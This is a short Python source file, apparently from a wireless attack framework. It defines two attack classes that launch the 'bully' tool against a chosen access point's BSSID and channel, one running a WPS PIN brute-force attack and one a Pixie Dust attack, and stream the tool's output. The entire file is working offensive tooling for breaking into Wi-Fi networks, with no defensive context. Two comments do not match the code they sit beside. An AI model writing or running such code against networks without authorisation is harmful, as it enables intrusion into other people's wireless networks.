import sys
from Model.Attacks.AbstractAttack import AbstractAttack
import subprocess as sb

class WPSBruteForceAttack(AbstractAttack):

    @classmethod
    def attack_name(cls) -> str:
        return 'WPS Brute Force'

    @classmethod
    def execute_attack(cls, q, kwargs):
        '''
        Attempts to get the password via WPS pixie dust with bully tool.
        '''
        cmd = ['bully',
            kwargs['interface'].monitor,
            '-b', kwargs['target'].bssid,
            '--channel', str(kwargs['target'].channel), 
            '-v', '4'] #verbose lvl 2
        
        p = sb.Popen(["stdbuf","-i0","-o0","-e0"]  + cmd, stdout=sb.PIPE, text = True)
        for line in p.stdout:
            q.put(line)
        p.kill()
        

class PixieDustAttack(AbstractAttack):

    @classmethod
    def attack_name(cls) -> str:
        return 'Pixie Dust'

    @classmethod
    def execute_attack(cls, q, kwargs):
        '''
        Attempts to get the password via WPS pixie dust with bully tool.
        '''
        cmd = ['bully',
            kwargs['interface'].monitor,
            '-b', kwargs['target'].bssid,
            '--channel', str(kwargs['target'].channel), 
            '-d', #pixie dust
            '-v', '2'] #verbose lvl 2

        p = sb.Popen(["stdbuf","-i0","-o0","-e0"]  + cmd, stdout=sb.PIPE, text = True)
        for line in p.stdout:
            q.put(line)
        p.kill()
        